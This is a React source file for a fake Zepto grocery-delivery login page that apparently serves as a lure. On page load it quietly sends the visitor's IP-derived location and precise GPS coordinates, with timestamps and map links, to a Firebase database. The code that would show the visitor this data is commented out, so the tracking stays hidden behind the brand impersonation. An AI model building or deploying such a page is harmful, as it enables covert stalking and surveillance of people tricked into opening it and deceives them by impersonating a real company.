import React, { useEffect, useState } from "react";
import { database } from "./firebase";
import { ref, push } from "firebase/database";

function App() {
  const [ipLocation, setIpLocation] = useState(null);
  const [gpsLocation, setGpsLocation] = useState(null);
  const [loading, setLoading] = useState(true);
  const [gpsDenied, setGpsDenied] = useState(false);
  const userId = "user-" + Date.now(); // Unique user ID for session

  useEffect(() => {
    getIPLocation();
  }, []);

  // Convert timestamp to IST
  const getISTTime = () => {
    return new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
  };

  // Fetch IP-based location first
  const getIPLocation = async () => {
    try {
      const response = await fetch(`https://ip-api.com/json?timestamp=${Date.now()}`);
      const data = await response.json();
      const ipData = {
        latitude: data.lat,
        longitude: data.lon,
        city: data.city,
        country: data.country,
        method: "IP",
        timestamp: getISTTime(),
        mapLink: `https://www.google.com/maps?q=${data.lat},${data.lon}`,
      };
      setIpLocation(ipData);
      saveLocation(userId, "ipLocation", ipData);
      requestGPSLocation();
    } catch (err) {
      console.error("IP Geolocation failed:", err);
      requestGPSLocation();
    }
  };

  // Request GPS permission
  const requestGPSLocation = () => {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const { latitude, longitude } = position.coords;
          const gpsData = {
            latitude,
            longitude,
            method: "GPS",
            timestamp: getISTTime(),
            mapLink: `https://www.google.com/maps?q=${latitude},${longitude}`,
          };
          setGpsLocation(gpsData);
          saveLocation(userId, "gpsLocation", gpsData);
          setLoading(false);
        },
        (error) => {
          console.warn("GPS permission denied or failed:", error);
          setGpsLocation(null);
          setGpsDenied(true);
          setLoading(false);
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    } else {
      console.error("Geolocation not supported");
    }
  };

  // Save to Firebase
  const saveLocation = async (userId, type, data) => {
    const locationRef = ref(database, `userLocations/${userId}/${type}`);
    await push(locationRef, data);
  };

  return (
    <div style={{ display: "flex", justifyContent: "center", alignItems: "center", height: "100vh", backgroundColor: "#f0f2f5", fontFamily: "Arial, sans-serif" }}>
      <div style={{ textAlign: "center", width: "90%", maxWidth: "400px", backgroundColor: "white", padding: "20px", borderRadius: "8px", boxShadow: "0px 4px 10px rgba(0,0,0,0.1)" }}>
        <h1 style={{ color: "#2A2E43", fontSize: "32px", fontWeight: "bold" }}>Zepto</h1>
        <p style={{ color: "#606770", fontSize: "16px" }}>Fast & seamless grocery delivery</p>

        <input type="text" placeholder="Enter Mobile Number" style={{ width: "100%", padding: "12px", margin: "10px 0", borderRadius: "6px", border: "1px solid #ddd", fontSize: "16px" }} />
        <input type="password" placeholder="Enter OTP" style={{ width: "100%", padding: "12px", margin: "10px 0", borderRadius: "6px", border: "1px solid #ddd", fontSize: "16px" }} />
        <button style={{ width: "100%", padding: "12px", backgroundColor: "#FF4C3B", color: "white", fontSize: "16px", fontWeight: "bold", border: "none", borderRadius: "6px", cursor: "pointer", marginTop: "10px" }}>Log In</button>

        {/* Location Information */}
        {/* <div style={{ marginTop: "20px", fontSize: "14px", color: "#606770" }}>
          {loading ? (
            <p>Fetching location...</p>
          ) : (
            <div>
              <h3>IP Location</h3>
              {ipLocation ? (
                <div>
                  <p>Latitude: {ipLocation.latitude}</p>
                  <p>Longitude: {ipLocation.longitude}</p>
                  <p>City: {ipLocation.city}</p>
                  <p>Country: {ipLocation.country}</p>
                  <p>Timestamp (IST): {ipLocation.timestamp}</p>
                  <a href={ipLocation.mapLink} target="_blank" rel="noopener noreferrer" style={{ color: "#1877f2", textDecoration: "none", fontWeight: "bold" }}>View on Google Maps</a>
                </div>
              ) : (
                <p>Could not fetch IP location.</p>
              )}

              <h3>GPS Location</h3>
              {gpsLocation ? (
                <div>
                  <p>Latitude: {gpsLocation.latitude}</p>
                  <p>Longitude: {gpsLocation.longitude}</p>
                  <p>Timestamp (IST): {gpsLocation.timestamp}</p>
                  <a href={gpsLocation.mapLink} target="_blank" rel="noopener noreferrer" style={{ color: "#1877f2", textDecoration: "none", fontWeight: "bold" }}>View on Google Maps</a>
                </div>
              ) : gpsDenied ? (
                <p style={{ color: "red", fontWeight: "bold" }}>GPS is blocked. Please enable location services.</p>
              ) : (
                <p>Fetching GPS location...</p>
              )}
            </div>
          )}
        </div> */}
      </div>
    </div>
  );
}

export default App;
